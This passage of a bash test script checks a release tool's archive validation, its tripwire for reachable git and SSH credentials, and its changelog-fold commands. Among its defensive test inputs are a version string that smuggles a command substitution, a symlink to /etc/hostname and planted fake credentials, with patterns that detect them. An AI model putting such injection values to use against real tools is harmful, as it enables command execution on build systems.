    printf 'archive %s\n' "$target" > "$dir/pulumi-resource-envoy-infra-v0.1.0-$target.tar.gz"
  done
  [ -z "$mutation" ] || (cd "$dir" && eval "$mutation")
  for target in "${handed_targets[@]}"; do
    names+=("pulumi-resource-envoy-infra-v$version-$target.tar.gz")
  done
  set +e
  out=$(cd "$hd" && "$release_push" handed envoy-infra-v "$version" "$dir" "${names[@]}" 2>"$hd/$name.err")
  rc=$?
  set -e
  err=$(<"$hd/$name.err")
}
# refused <description>: the three things every refusal shares, checked at once.
refused() {
  check "$1: exits non-zero, prints no tag" "$([ "$rc" != 0 ] && [ -z "$out" ] && echo true || echo false)"
}
a=pulumi-resource-envoy-infra-v0.1.0

handed_run real 0.1.0
check "the real set: exits 0" "$(is "$rc" 0)"
check "the real set: prints exactly the tag, the prefix and the version" "$(is "$out" envoy-infra-v0.1.0)"
check "the real set: says nothing on stderr" "$(is "$err" "")"

# shellcheck disable=SC2016 # the literal text a forged version would carry, never expanded
handed_run substitution '0.1.0$(id>pwned-version)'
refused "a version with a command substitution"
check "a version with a command substitution: is refused as not X.Y.Z" "$(contains "$err" 'is not X.Y.Z')"
check "a version with a command substitution: never runs" \
  "$([ ! -e "$hd/pwned-version" ] && [ ! -e "$hd/substitution/pwned-version" ] && echo true || echo false)"
handed_run leading-zero 0.01.0
refused "a version with a leading zero"
check "a version with a leading zero: names it" "$(contains "$err" 'version 0.01.0 is not X.Y.Z')"
handed_run two-fields 0.1
refused "a version of two fields"
check "a version of two fields: names it" "$(contains "$err" 'version 0.1 is not X.Y.Z')"
handed_run trailing-newline $'0.1.0\n'
refused "a version with a trailing newline"
check "a version with a trailing newline: is refused as not X.Y.Z" "$(contains "$err" 'is not X.Y.Z')"

handed_run another-release 99.0.0
refused "another release's version, over this release's archives"
check "another release's version: names the archives it expected" \
  "$(contains "$err" "lacks pulumi-resource-envoy-infra-v99.0.0-linux-amd64.tar.gz")"
check "another release's version: names the archives it was handed" \
  "$(contains "$err" "does not ship: .*$a-linux-amd64.tar.gz")"
handed_run missing 0.1.0 "rm $a-darwin-arm64.tar.gz"
refused "a missing archive"
check "a missing archive: names it" "$(contains "$err" "lacks $a-darwin-arm64.tar.gz")"
handed_run extra-file 0.1.0 "printf 'not legion\n' > legion-linux-amd64.tar.gz"
refused "an extra file"
check "an extra file: names it" "$(contains "$err" 'does not ship: legion-linux-amd64.tar.gz')"
handed_run build-sums 0.1.0 "sha256sum -- *.tar.gz > SHA256SUMS"
refused "a SHA256SUMS the build wrote (publish writes its own)"
check "a SHA256SUMS the build wrote: names it" "$(contains "$err" 'does not ship: SHA256SUMS')"
handed_run extra-dir 0.1.0 "mkdir sub && printf x > sub/x"
refused "an extra directory"
check "an extra directory: names it and what it holds" "$(contains "$err" 'does not ship: sub sub/x')"
handed_run newline-name 0.1.0 "printf x > \$'evil\nname'"
refused "an extra file whose name holds a newline"
check "an extra file whose name holds a newline: names it quoted" "$(contains "$err" "\$'evil\\\\nname'")"
handed_run symlink 0.1.0 "rm $a-linux-arm64.tar.gz && ln -s /etc/hostname $a-linux-arm64.tar.gz"
refused "an archive swapped for a symlink"
check "an archive swapped for a symlink: says it is not a regular file" \
  "$(contains "$err" "$a-linux-arm64.tar.gz in .* is not a regular file")"
check "an archive swapped for a symlink: does not call it missing" "$(is "$(contains "$err" 'lacks')" false)"
handed_run directory 0.1.0 "rm $a-linux-amd64.tar.gz && mkdir $a-linux-amd64.tar.gz"
refused "an archive replaced by a directory"
check "an archive replaced by a directory: says it is not a regular file" \
  "$(contains "$err" "$a-linux-amd64.tar.gz in .* is not a regular file")"

set +e
out=$("$release_push" handed envoy-infra-v 0.1.0 "$hd/no-such-dir" "$a-linux-amd64.tar.gz" 2>"$hd/no-dir.err")
rc=$?
set -e
err=$(<"$hd/no-dir.err")
refused "a directory that does not exist"
check "a directory that does not exist: names it" "$(contains "$err" 'no-such-dir is not a directory')"
mkdir "$hd/nested" && mkdir "$hd/nested/sub" && printf x > "$hd/nested/sub/x"
set +e
out=$("$release_push" handed envoy-infra-v 0.1.0 "$hd/nested" sub/x 2>"$hd/nested.err")
rc=$?
set -e
err=$(<"$hd/nested.err")
refused "a file named with a /"
check "a file named with a /: says each file is a name in the directory" "$(contains "$err" 'sub/x is not a file name')"
set +e
out=$("$release_push" handed envoy-infra-v 0.1.0 "$hd/real" 2>"$hd/no-files.err")
rc=$?
set -e
refused "no file to check"

echo
echo "Case: no-credential names a reachable credential and never shows it"
# Each case runs the tripwire from a clean clone under an environment of only PATH, a throwaway
# HOME and the hermetic git settings, plants one credential at a time and checks the output names
# it without showing its value (each value carries a marker the output must lack).
nc="$work/nc"
setup "$nc"
mkdir "$nc/home"
# no_credential [VAR=value...]: runs `release-push.sh no-credential` in clone a; leaves its exit
# code in rc and its combined output in out.
no_credential() {
  set +e
  out=$(cd "$nc/a" && env -i PATH="$PATH" HOME="$nc/home" GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 \
    "$@" bash "$release_push" no-credential 2>&1)
  rc=$?
  set -e
}
# lacks <marker>: true when the output never shows <marker>, for check.
lacks() { is "$(contains "$out" "$1")" false; }
clean='git config entries matching credential|insteadof|sshcommand|extraheader (names only):
  none
~/.ssh:
  absent
GIT_SSH_COMMAND: unset
SSH_AUTH_SOCK: unset
DEPLOY_KEY: unset
ACTIONS_ID_TOKEN_REQUEST_URL: unset
ACTIONS_ID_TOKEN_REQUEST_TOKEN: unset
no credential reachable'
no_credential
check "a clean job: exits 0" "$(is "$rc" 0)"
check "a clean job: prints none, absent, the five variables unset and no credential reachable" "$(is "$out" "$clean")"
no_credential GIT_SSH_COMMAND=ssh-marker-7f3a
check "GIT_SSH_COMMAND set: exits 1, naming it" \
  "$(is "$rc|$(contains "$out" '^GIT_SSH_COMMAND: set$')|$(contains "$out" '^::error::GIT_SSH_COMMAND is set$')" '1|true|true')"
check "GIT_SSH_COMMAND set: never shows the value" "$(lacks ssh-marker-7f3a)"
check "GIT_SSH_COMMAND set: does not call the job clean" "$(lacks 'no credential reachable')"
no_credential ACTIONS_ID_TOKEN_REQUEST_TOKEN=secret-value-2b7d
check "the OIDC token set: exits 1, naming it" "$(is "$rc|$(contains "$out" '^ACTIONS_ID_TOKEN_REQUEST_TOKEN: set$')" '1|true')"
check "the OIDC token set: never shows the value" "$(lacks secret-value-2b7d)"
no_credential DEPLOY_KEY=keymarker-4e
check "DEPLOY_KEY set: exits 1, naming it" "$(is "$rc|$(contains "$out" '^DEPLOY_KEY: set$')" '1|true')"
check "DEPLOY_KEY set: never shows the value" "$(lacks keymarker-4e)"
git -C "$nc/a" config core.sshCommand 'ssh -i /secret/marker-9c1e'
no_credential
check "core.sshCommand in the clone: exits 1, naming the entry" "$(is "$rc|$(contains "$out" '^  file:.*core\.sshcommand$')" '1|true')"
check "core.sshCommand in the clone: never shows the value" "$(lacks marker-9c1e)"
check "core.sshCommand in the clone: says git holds it" "$(contains "$out" '^::error::git holds credential or SSH configuration$')"
git -C "$nc/a" config --unset core.sshCommand
git -C "$nc/a" config url.git@github.com:.insteadOf https://github.com/
no_credential
check "url.*.insteadOf in the clone: exits 1, naming the entry" "$(is "$rc|$(contains "$out" '^  file:.*url\.git@github\.com:\.insteadof$')" '1|true')"
git -C "$nc/a" config http.https://github.com/.extraheader 'AUTHORIZATION: basic dG9rZW4tbWFya2VyLTZkMQ=='
no_credential
check "http.*.extraheader beside it: exits 1, each entry on its own indented line" \
  "$(is "$rc|$(printf '%s\n' "$out" | grep -c '^  file:')|$(contains "$out" '^  file:.*http\.https://github\.com/\.extraheader$')" '1|2|true')"
check "http.*.extraheader beside it: never shows the header" "$(lacks dG9rZW4)"
git -C "$nc/a" config --unset url.git@github.com:.insteadOf
git -C "$nc/a" config --unset http.https://github.com/.extraheader
git -C "$nc/a" config credential.helper store
no_credential
check "credential.helper in the clone: exits 1, naming the entry" "$(is "$rc|$(contains "$out" '^  file:.*credential\.helper$')" '1|true')"
git -C "$nc/a" config --unset credential.helper
mkdir "$nc/home/.ssh"
printf 'not a key\n' > "$nc/home/.ssh/id_ed25519"
no_credential
check "id_ed25519 in ~/.ssh: exits 1, listing it and naming the directory" \
  "$(is "$rc|$(contains "$out" ' id_ed25519$')|$(contains "$out" '^::error::~/\.ssh holds entries other than known_hosts$')" '1|true|true')"
rm "$nc/home/.ssh/id_ed25519"
: > "$nc/home/.ssh/known_hosts"
no_credential
check "known_hosts alone in ~/.ssh: exits 0, clean" "$(is "$rc|$(contains "$out" '^no credential reachable$')" '0|true')"
rm -r "$nc/home/.ssh"
mkdir "$nc/elsewhere" && printf 'not a key\n' > "$nc/elsewhere/id_rsa" && ln -s "$nc/elsewhere" "$nc/home/.ssh"
no_credential
check "a symlinked .ssh directory holding a key: exits 1, following it" \
  "$(is "$rc|$(contains "$out" ' id_rsa$')|$(contains "$out" '^::error::~/\.ssh holds entries other than known_hosts$')" '1|true|true')"
rm "$nc/home/.ssh"
printf 'not a directory\n' > "$nc/home/.ssh"
no_credential
check "a regular file at .ssh: exits 1, refusing it" "$(is "$rc|$(contains "$out" '^::error::~/\.ssh is not a directory$')" '1|true')"
rm "$nc/home/.ssh"
printf 'not a config [\n' > "$nc/bad.gitconfig"
no_credential GIT_CONFIG_GLOBAL="$nc/bad.gitconfig"
check "an unreadable git configuration: exits 1, naming git config's exit code" \
  "$(is "$rc|$(contains "$out" '^::error::git config --get-regexp exited 128, so the git configuration could not be read$')" '1|true')"

echo
echo "Case: fold-plan labels each fragment with the release that first shipped it, and push-fold lands the fold"
# The template: clone a, detached at the base (the fold's checkout), and a bare origin whose main
# is the base. packages/rel is released under rel-v; packages/side and packages/plain have no
# release of their own; packages/empty has no fragment; packages/nolog has no CHANGELOG.md.
ft="$work/fold-template"
mkdir -p "$ft/a"
git init -q -b main "$ft/a"
identity "$ft/a"
# commit_at <date> <subject>: commit everything in the template's clone with <date> as its
# author and committer date.
commit_at() {
  git -C "$ft/a" add -A
  GIT_AUTHOR_DATE=$1 GIT_COMMITTER_DATE=$1 git -C "$ft/a" commit -q -m "$2"
}
# fragment <package> <name> <kind> <body>: write a fragment, as `changie new` would, into the
# template's clone.
fragment() {
  mkdir -p "$ft/a/packages/$1/.changes/unreleased"
  printf 'kind: %s\nbody: %s\n' "$3" "$4" > "$ft/a/packages/$1/.changes/unreleased/$2.yaml"
}
mkdir -p "$ft/a/packages/rel" "$ft/a/packages/side" "$ft/a/packages/plain" "$ft/a/packages/empty" "$ft/a/packages/nolog"
rel_log='# Changelog

## [2.0.0] - 2026-01-01

### Added

- a release on top

## [Unreleased]

### Added

- an old unreleased entry

## [1.5.0]

### Fixed

- an old fix'
side_log='# Changelog

## [Unreleased]

- an old side entry'
plain_log='# Changelog

No release yet.'
printf '%s\n' "$rel_log" > "$ft/a/packages/rel/CHANGELOG.md"
printf '%s\n' "$side_log" > "$ft/a/packages/side/CHANGELOG.md"
printf '%s\n' "$plain_log" > "$ft/a/packages/plain/CHANGELOG.md"
printf '# Changelog\n' > "$ft/a/packages/empty/CHANGELOG.md"
printf '{"name": "rel", "version": "1.5.0"}\n' > "$ft/a/packages/rel/package.json"
printf 'no changelog\n' > "$ft/a/packages/nolog/README.md"
commit_at 2026-02-01T12:00:00+00:00 "chore: seed"
fragment rel INFRA-1-first Added "the first entry"
fragment rel INFRA-1-another Added "another entry"
fragment side INFRA-1-side Changed "a side entry"
fragment nolog INFRA-1-nolog Added "never folded"
commit_at 2026-02-10T12:00:00+00:00 "feat: first"
# The bump-shaped release tag: on a child of the built commit that main never holds, committed
# at 23:30 on March 1 in UTC-5, which is March 2 in UTC.
git -C "$ft/a" checkout -q --detach
printf '{"name": "rel", "version": "1.9.0"}\n' > "$ft/a/packages/rel/package.json"
commit_at 2026-03-01T23:30:00-05:00 "chore: release rel v1.9.0 [skip ci]"
git -C "$ft/a" tag rel-v1.9.0
git -C "$ft/a" checkout -q main
fragment rel INFRA-2-second Fixed "the second entry"
# The listener-shaped tag, on the built commit itself, at 01:00 on March 5 in UTC+9.
commit_at 2026-03-05T01:00:00+09:00 "feat: second"
git -C "$ft/a" tag rel-v1.10.0
fragment rel INFRA-3-third Added "in no release yet"
fragment side INFRA-3-side Fixed "another side entry"
fragment plain INFRA-3-plain Added "a plain entry"
commit_at 2026-04-10T22:15:00-07:00 "feat: third"
git -C "$ft/a" tag rel-v1.11.0-rc.1
base=$(git -C "$ft/a" rev-parse HEAD)
c2=$(git -C "$ft/a" rev-parse HEAD~1)
main_label="main@${base:0:12}"
git clone -q --bare "$ft/a" "$ft/origin.git"
git -C "$ft/a" checkout -q --detach
# Only in the working tree, never committed: not a fragment of HEAD.
printf 'kind: Added\nbody: untracked\n' > "$ft/a/packages/rel/.changes/unreleased/INFRA-9-untracked.yaml"

# fold_plan_run <spec>...: runs fold-plan in the template's clone; leaves rc, out (stdout) and
# err (stderr).
fold_plan_run() {
  set +e
  out=$(cd "$ft/a" && "$release_push" fold-plan "$@" 2>"$work/fold-plan.err")
  rc=$?
  set -e
  err=$(<"$work/fold-plan.err")
}
u=.changes/unreleased
rel_plan="packages/rel	1.9.0	2026-03-02	packages/rel/$u/INFRA-1-another.yaml
packages/rel	1.9.0	2026-03-02	packages/rel/$u/INFRA-1-first.yaml
packages/rel	1.10.0	2026-03-04	packages/rel/$u/INFRA-2-second.yaml"
side_plan="packages/side	$main_label	2026-04-11	packages/side/$u/INFRA-1-side.yaml
packages/side	$main_label	2026-04-11	packages/side/$u/INFRA-3-side.yaml"
fold_plan_run packages/rel=rel-v packages/side
check "fold-plan: exits 0, saying nothing on stderr" "$(is "$rc|$err" "0|")"
check "fold-plan: a fragment under two tags gets the lower version, one under the listener-shaped tag its version, one in no release none, in version order, dated in UTC" \
  "$(is "$out" "$rel_plan"$'\n'"$side_plan")"
fold_plan_run packages/side packages/rel=rel-v
check "fold-plan: the packages come in the specs' order" "$(is "$out" "$side_plan"$'\n'"$rel_plan")"
fold_plan_run packages/empty
check "fold-plan: a package without fragments plans nothing" "$(is "$rc|$out" "0|")"
fold_plan_run
check "fold-plan: no spec is refused" "$(is "$rc|$(contains "$err" '^::error::release-push.sh fold-plan: no package spec')" "1|true")"
for spec in packages/rel= ../rel 'packages/rel=rel v' /packages/rel; do
  fold_plan_run "$spec"
  printf -v shown '%q' "$spec"
  check "fold-plan: the spec $shown is refused" \
    "$(is "$rc|$out|$(contains "$err" '^::error::release-push.sh fold-plan: package spec .* is not <package-dir>\[=<tag-prefix>\]')" "1||true")"
done
fold_plan_run packages/side other/side
check "fold-plan: two specs of one basename are refused" "$(is "$rc|$(contains "$err" 'two package specs name a directory side')" "1|true")"
fold_plan_run packages/rel=rel-v packages/nolog
check "fold-plan: a package without CHANGELOG.md is refused, printing no plan" \
  "$(is "$rc|$out|$(contains "$err" '^::error::release-push.sh fold-plan: packages/nolog holds no CHANGELOG.md at HEAD')" "1||true")"

# Anything directly in an unreleased directory but a regular file whose name ends in .yaml is
# refused, by name, with no plan printed: the fold would never fold it. Each package of this
# repository holds one fragment and one such entry: a subdirectory, a .yml file, a README.md and
# a symlink.
rt="$work/fold-refuse"
git init -q -b main "$rt"
identity "$rt"
for package in sub yml readme link; do
  mkdir -p "$rt/packages/$package/$u"
  printf '# Changelog\n' > "$rt/packages/$package/CHANGELOG.md"
  printf 'kind: Added\nbody: fine\n' > "$rt/packages/$package/$u/INFRA-1-fine.yaml"
done
mkdir -p "$rt/packages/sub/$u/sjawhar"
printf 'kind: Added\nbody: nested\n' > "$rt/packages/sub/$u/sjawhar/fix-thing.yaml"
printf 'kind: Added\nbody: yml\n' > "$rt/packages/yml/$u/INFRA-1-a.yml"
printf 'not a fragment\n' > "$rt/packages/readme/$u/README.md"
ln -s INFRA-1-fine.yaml "$rt/packages/link/$u/link.yaml"
git -C "$rt" add -A
git -C "$rt" commit -q -m "feat: odd entries"
# refuse_run <spec>...: runs fold-plan in that repository; leaves rc, out and err.
refuse_run() {
  set +e
  out=$(cd "$rt" && "$release_push" fold-plan "$@" 2>"$work/fold-refuse.err")
  rc=$?
  set -e
  err=$(<"$work/fold-refuse.err")
}
refused='at HEAD: each entry in a package.s \.changes/unreleased/ must be a regular file whose name ends in \.yaml'
for entry in sub/sjawhar yml/INFRA-1-a.yml readme/README.md link/link.yaml; do
  refuse_run "packages/${entry%%/*}"
  check "fold-plan: packages/${entry%%/*}/$u/${entry#*/} is refused by name, with no plan" \
    "$(is "$rc|$out|$(contains "$err" "^::error::release-push\.sh fold-plan: packages/${entry%%/*}/$u/${entry#*/} $refused")" "1||true")"
done
refuse_run packages/sub packages/yml packages/readme packages/link
check "fold-plan: one error names every refused entry of every spec, sorted, with no plan" \
  "$(is "$rc|$out|$(grep -c '^::error::' <<<"$err")|$(contains "$err" "^::error::release-push\.sh fold-plan: packages/link/$u/link\.yaml packages/readme/$u/README\.md packages/sub/$u/sjawhar packages/yml/$u/INFRA-1-a\.yml $refused")" "1||1|true")"

# A fragment name holding a glob character is still one file: fold-plan finds the commit that
# added that file, never one that added another file the name matches as a pattern. Here
# INFRA-7-[a].yaml ships in glob-v1.0.0, and INFRA-7-a.yaml, which `[a]` matches as a glob, is
# added after it and ships in glob-v1.1.0.
gt="$work/fold-glob"
mkdir -p "$gt/packages/glob/.changes/unreleased"
git init -q -b main "$gt"
identity "$gt"
printf '# Changelog\n' > "$gt/packages/glob/CHANGELOG.md"
printf 'kind: Added\nbody: bracketed\n' > "$gt/packages/glob/.changes/unreleased/INFRA-7-[a].yaml"
git -C "$gt" add -A
GIT_COMMITTER_DATE=2026-05-01T12:00:00+00:00 git -C "$gt" commit -q -m "feat: bracketed"
git -C "$gt" tag glob-v1.0.0
printf 'kind: Added\nbody: plain\n' > "$gt/packages/glob/.changes/unreleased/INFRA-7-a.yaml"
git -C "$gt" add -A
GIT_COMMITTER_DATE=2026-05-02T12:00:00+00:00 git -C "$gt" commit -q -m "feat: plain"
git -C "$gt" tag glob-v1.1.0
set +e
out=$(cd "$gt" && "$release_push" fold-plan packages/glob=glob-v 2>/dev/null)
rc=$?
set -e
check "fold-plan: a fragment whose name holds a glob character gets the release of the commit that added that very file" \
  "$(is "$rc|$out" "0|packages/glob	1.0.0	2026-05-01	packages/glob/$u/INFRA-7-[a].yaml
packages/glob	1.1.0	2026-05-02	packages/glob/$u/INFRA-7-a.yaml")"

# A fragment renamed with git mv keeps the release of the commit that first added it. Here
# sjawhar/fix.yaml, in a subdirectory fold-plan refuses, ships in ren-v1.0.0; a later commit moves
# it to sjawhar-fix.yaml, and INFRA-8-later.yaml, alike enough to read to git as a copy of it, is
# added after that and ships in ren-v1.1.0 (`git log --follow` would follow that copy).
nt="$work/fold-rename"
mkdir -p "$nt/packages/ren/$u/sjawhar"
git init -q -b main "$nt"
identity "$nt"
printf '# Changelog\n' > "$nt/packages/ren/CHANGELOG.md"
printf 'component: ren\nkind: Fixed\nbody: a nested fix\n' > "$nt/packages/ren/$u/sjawhar/fix.yaml"
git -C "$nt" add -A
GIT_COMMITTER_DATE=2026-06-01T12:00:00+00:00 git -C "$nt" commit -q -m "fix: nested"
git -C "$nt" tag ren-v1.0.0
set +e
out=$(cd "$nt" && "$release_push" fold-plan packages/ren=ren-v 2>"$work/fold-rename.err")
rc=$?
set -e
err=$(<"$work/fold-rename.err")
check "fold-plan: the refusal of a misplaced entry says to move or rename a fragment in one commit with git mv" \
  "$(is "$rc|$out|$(contains "$err" "^::error::release-push\.sh fold-plan: packages/ren/$u/sjawhar $refused.* in one commit, with git mv")" "1||true")"
git -C "$nt" mv "packages/ren/$u/sjawhar/fix.yaml" "packages/ren/$u/sjawhar-fix.yaml"
GIT_COMMITTER_DATE=2026-06-02T12:00:00+00:00 git -C "$nt" commit -q -m "chore: move the fragment"
printf 'component: ren\nkind: Fixed\nbody: a later fix\n' > "$nt/packages/ren/$u/INFRA-8-later.yaml"
git -C "$nt" add -A
GIT_COMMITTER_DATE=2026-06-03T12:00:00+00:00 git -C "$nt" commit -q -m "fix: later"
git -C "$nt" tag ren-v1.1.0
set +e
out=$(cd "$nt" && "$release_push" fold-plan packages/ren=ren-v 2>/dev/null)
rc=$?
set -e
check "fold-plan: a fragment renamed with git mv gets the release of the commit that first added it, and one alike enough to read as its copy its own" \
  "$(is "$rc|$out" "0|packages/ren	1.0.0	2026-06-01	packages/ren/$u/sjawhar-fix.yaml
packages/ren	1.1.0	2026-06-03	packages/ren/$u/INFRA-8-later.yaml")"

# The stub gh, first on PATH in a directory of its own. It logs each call to $GH_TEST_DIR/calls as
# one line, each argument in brackets; `gh workflow run` fails when $GH_TEST_FAIL is set, and any
# other call fails as unexpected.
mkdir -p "$work/fold-bin"
cat > "$work/fold-bin/gh" <<'GH'
#!/usr/bin/env bash
{ printf '[%s]' "$@"; printf '\n'; } >> "$GH_TEST_DIR/calls"
[ "$1 $2" = "workflow run" ] || { echo "unexpected gh call: $*" >&2; exit 3; }
[ -z "$GH_TEST_FAIL" ] || { echo "HTTP 403: Resource not accessible by integration" >&2; exit 1; }
GH
chmod +x "$work/fold-bin/gh"
fold_specs=(packages/rel=rel-v packages/side packages/plain packages/empty)
# fold_case <name>: a copy of the template at $work/<name> ($fc), with the notes of the plan of
# fold_specs in $fc/notes, as a build job hands them (blank lines around them are trimmed).
fold_case() {
  fc="$work/$1"
  fold_base=$base fold_tip=$base
  cp -a "$ft" "$fc"
  mkdir "$fc/notes"
  printf '\n\n### Added\n\n- the first entry\n- another entry\n\n\n' > "$fc/notes/rel_1.9.0.md"
  printf '### Fixed\n\n- the second entry\n  continued\n' > "$fc/notes/rel_1.10.0.md"
  printf '### Changed\n\n- side entries\n' > "$fc/notes/side_$main_label.md"
  printf '### Added\n\n- a plain entry\n' > "$fc/notes/plain_$main_label.md"
}
# push_fold [VAR=value...]: runs `release-push.sh push-fold $fold_base $fc/notes <fold_specs>` in
# the case's clone with the deploy key, a fresh TMPDIR, the GitHub URL rewritten to the case's
# origin and the stub gh; leaves rc, out (combined), calls (the stub's log) and left (what TMPDIR
# holds afterwards).
push_fold() {
  rm -rf "$fc/tmp" && mkdir "$fc/tmp"
  : > "$fc/calls"
  set +e
  out=$(cd "$fc/a" && env TMPDIR="$fc/tmp" GITHUB_REPOSITORY=example/repo DEPLOY_KEY="$(<"$work/deploy")" \
    GH_TEST_DIR="$fc" GH_TEST_FAIL='' PATH="$work/fold-bin:$PATH" GIT_CONFIG_COUNT=1 \
    GIT_CONFIG_KEY_0="url.$fc/origin.git.insteadOf" GIT_CONFIG_VALUE_0="git@github.com:example/repo.git" \
    "$@" "$release_push" push-fold "$fold_base" "$fc/notes" "${fold_specs[@]}" 2>&1)
  rc=$?
  set -e
  calls=$(<"$fc/calls")
  left=$(find "$fc/tmp" -mindepth 1 | wc -l)
}
# untouched [<status>]: true when the case's clone is still at its checkout ($fold_tip) with the
# working-tree status <status> (none by default), origin's main is still there and gh was not
# called.
untouched() {
  [ "$(git -C "$fc/a" rev-parse HEAD)" = "$fold_tip" ] &&
    [ "$(git -C "$fc/a" status --porcelain --untracked-files=no)" = "${1:-}" ] &&
    [ "$(git -C "$fc/origin.git" rev-parse main)" = "$fold_tip" ] && [ -z "$calls" ] && echo true || echo false
}
# kept <old> <new>: true when every line of <old> is in <new>, in order (a diff deletes none).
kept() { is "$(contains "$(diff <(printf '%s\n' "$1") <(printf '%s\n' "$2") || true)" '^<')" false; }

fold_case fold-accepted
push_fold
check "push-fold: exits 0, leaving nothing in TMPDIR" "$(is "$rc|$left" "0|0")"
check "push-fold: says what it folded, and gives no notice" \
  "$(is "$(contains "$out" '^Folded 6 fragments into packages/rel/CHANGELOG.md packages/side/CHANGELOG.md packages/plain/CHANGELOG.md$')|$(contains "$out" '::notice')" "true|false")"
check "push-fold: calls no gh" "$(is "$calls" "")"
o="$fc/origin.git"
check "push-fold: origin's main is one commit over the base" \
  "$(is "$(git -C "$o" rev-list --count "$base..main")|$(git -C "$o" log -1 --format=%P main)" "1|$base")"
check "push-fold: the commit's message is the fixed subject alone" \
  "$(is "$(git -C "$o" cat-file commit main | sed '1,/^$/d' | od -c)" "$(printf 'chore: fold changelog fragments [skip ci]\n' | od -c)")"
check "push-fold: the commit's author and committer are github-actions[bot]" \
  "$(is "$(git -C "$o" log -1 --format='%an <%ae>|%cn <%ce>' main)" \
    "github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>|github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>")"
check "push-fold: the planned fragments are gone, the changelogs changed, and nothing else" \
  "$(is "$(git -C "$o" diff --name-status "$base" main)" "D	packages/plain/$u/INFRA-3-plain.yaml
M	packages/plain/CHANGELOG.md
D	packages/rel/$u/INFRA-1-another.yaml
D	packages/rel/$u/INFRA-1-first.yaml
D	packages/rel/$u/INFRA-2-second.yaml
M	packages/rel/CHANGELOG.md
D	packages/side/$u/INFRA-1-side.yaml
D	packages/side/$u/INFRA-3-side.yaml
M	packages/side/CHANGELOG.md")"
new_rel=$(git -C "$o" show main:packages/rel/CHANGELOG.md)
check "push-fold: every old line of a changelog stays, in order" "$(kept "$rel_log" "$new_rel")"
check "push-fold: both versions go below the higher one present, newest first, above [Unreleased]" \
  "$(is "$new_rel" '# Changelog

## [2.0.0] - 2026-01-01

### Added

- a release on top

## [1.10.0] - 2026-03-04

### Fixed

- the second entry
  continued

## [1.9.0] - 2026-03-02

### Added

- the first entry
- another entry

## [Unreleased]

### Added

- an old unreleased entry

## [1.5.0]

### Fixed

- an old fix')"
check "push-fold: a main@ block goes above the first ## line" \
  "$(is "$(git -C "$o" show main:packages/side/CHANGELOG.md)" "# Changelog

## [$main_label] - 2026-04-11

### Changed

- side entries

$(tail -n +3 <<<"$side_log")")"
check "push-fold: a changelog without a ## line gets the block appended after a blank line" \
  "$(is "$(git -C "$o" show main:packages/plain/CHANGELOG.md)" "$plain_log

## [$main_label] - 2026-04-11

### Added

- a plain entry")"
check "push-fold: the empty package's changelog and the unreleased entry stay" \
  "$(git -C "$o" cat-file -e "main:packages/rel/$u/INFRA-3-third.yaml" && git -C "$o" diff --quiet "$base" main -- packages/empty && echo true || echo false)"

fold_case fold-empty
fold_specs=(packages/empty)
push_fold
check "push-fold, empty plan: exits 0, saying nothing to fold" "$(is "$rc|$(contains "$out" '^Nothing to fold$')" "0|true")"
check "push-fold, empty plan: nothing written, origin untouched, gh not called" "$(is "$(untouched)" "true")"
fold_specs=(packages/rel=rel-v packages/side packages/plain packages/empty)

fold_case fold-moved
moved=$(git -C "$fc/a" commit-tree -p "$base" -m "fix: landed meanwhile" "$base^{tree}")
git -C "$fc/a" push -q "$fc/origin.git" "$moved:refs/heads/main"
push_fold
check "push-fold, main moved: exits 0" "$(is "$rc" 0)"
check "push-fold, main moved: origin's main is left where it moved" "$(is "$(git -C "$fc/origin.git" rev-parse main)" "$moved")"
check "push-fold, main moved: starts a run of changelog-fold.yaml on main" \
  "$(is "$calls" "$(argv workflow run changelog-fold.yaml --repo example/repo --ref main)")"
check "push-fold, main moved: the notice names both commits" \
  "$(contains "$out" "^::notice title=Nothing pushed; a fresh run started::main moved from $base, the commit [0-9a-f]* was made on, to $moved, so ")"
fold_case fold-moved-gh
moved=$(git -C "$fc/a" commit-tree -p "$base" -m "fix: landed meanwhile" "$base^{tree}")
git -C "$fc/a" push -q "$fc/origin.git" "$moved:refs/heads/main"
push_fold GH_TEST_FAIL=1
check "push-fold, main moved, gh fails: exits 1 with an ::error::" \
  "$(is "$rc|$(contains "$out" '^::error::release-push.sh push-fold: main moved .* starting a fresh run of changelog-fold.yaml on main failed')" "1|true")"

fold_case fold-rejected
printf '#!/usr/bin/env bash\necho "rejected by the test"\nexit 1\n' > "$fc/origin.git/hooks/pre-receive"
chmod +x "$fc/origin.git/hooks/pre-receive"
push_fold
check "push-fold, push rejected while main stays: exits 1 with an ::error::" \
  "$(is "$rc|$(contains "$out" "^::error::release-push.sh push-fold: the push of [0-9a-f]* to main was rejected while main's tip is still $base")" "1|true")"
check "push-fold, push rejected while main stays: origin untouched, gh not called" \
  "$(is "$(git -C "$fc/origin.git" rev-parse main)|$calls" "$base|")"

# fold_refused <description> <regex> [<status>]: the checks every refusal shares: exit 1, an
# ::error:: matching <regex>, and nothing written or pushed.
fold_refused() {
  check "push-fold refuses $1: exits 1 with an ::error::" \
    "$(is "$rc|$(contains "$out" "^::error::release-push.sh push-fold: $2")" "1|true")"
  check "push-fold refuses $1: nothing written, origin untouched" "$(untouched "${3:-}")"
}
fold_case fold-not-base
fold_base=$c2
push_fold
fold_refused "a HEAD that is not the base" "HEAD is $base, not the base $c2"
fold_case fold-dirty
printf 'dirt\n' >> "$fc/a/packages/rel/package.json"
push_fold
fold_refused "a dirty tree" "the working tree or the index differs from HEAD" " M packages/rel/package.json"
fold_case fold-missing
rm "$fc/notes/side_$main_label.md"
push_fold
fold_refused "a notes file missing" ".*notes lacks side_main@${base:0:12}\.md"
fold_case fold-extra
printf '### Added\n\n- smuggled\n' > "$fc/notes/rel_2.1.0.md"
push_fold
fold_refused "an extra notes file" ".*notes holds what the fold.s plan names no notes for: rel_2\.1\.0\.md"
fold_case fold-empty-notes
printf '\n  \n\n' > "$fc/notes/rel_1.10.0.md"
push_fold
fold_refused "an empty notes file" ".*rel_1\.10\.0\.md, the notes of packages/rel for 1\.10\.0, holds nothing but blank lines"
fold_case fold-nul
printf '### Added\n\n- a\000b\n' > "$fc/notes/rel_1.9.0.md"
push_fold
fold_refused "a notes file holding a NUL byte" ".*rel_1\.9\.0\.md, the notes of packages/rel for 1\.9\.0, holds a NUL byte"
fold_case fold-heading
printf '\n## [9.9.9] - forged\n' >> "$fc/notes/plain_$main_label.md"
push_fold
